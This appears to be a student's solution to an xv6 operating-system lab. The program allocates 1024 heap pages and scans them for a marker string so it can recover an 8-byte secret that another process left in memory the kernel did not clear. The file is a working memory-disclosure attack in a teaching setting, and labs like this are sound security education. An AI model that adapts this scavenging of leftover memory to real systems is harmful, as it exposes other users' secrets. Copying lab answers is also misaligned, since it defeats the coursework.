#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)

  const char *pattern = "my very very very secret pw is:   ";
  int pattern_len = 24;
  int secret_len = 8;
  int pages = 1024;

  char *end = sbrk(PGSIZE * pages);
  if (end == (char*)-1) {
      printf("attack: sbrk failed\n");
      exit(1);
  }

  for (int i = 0; i < secret_len; i++) {
    printf("argv[1][%d]: %d\n", i, (unsigned char)argv[1][i]);
  }

  printf("address of the pattern var: %p\n", pattern);
  printf("length of the pattern: %d\n", pattern_len);

  for (char *ptr = end; ptr < end + PGSIZE * pages - pattern_len; ptr++) {
      // Use memcmp to check if the current position matches the prefix.
      if (memcmp(ptr, pattern + 8, pattern_len) == 0) {
          // Found the prefix, the secret is right after it.

          printf("Found pattern at address: %p\n", ptr);
          printf("Pattern: <%s>\n", ptr);
          printf("Pattern and secret in dec:\n");
          for (int i = 0; i < 256; i++) {
              printf("%d ", (unsigned char)ptr[i]);
          }
          printf("\n");

          char *secret_addr = ptr + pattern_len;
          write(2, secret_addr, secret_len);
          exit(0); // Success.
      }
  }

  // If the loop finishes without finding the secret.
  printf("attack: secret not found\n");
  exit(1);
}
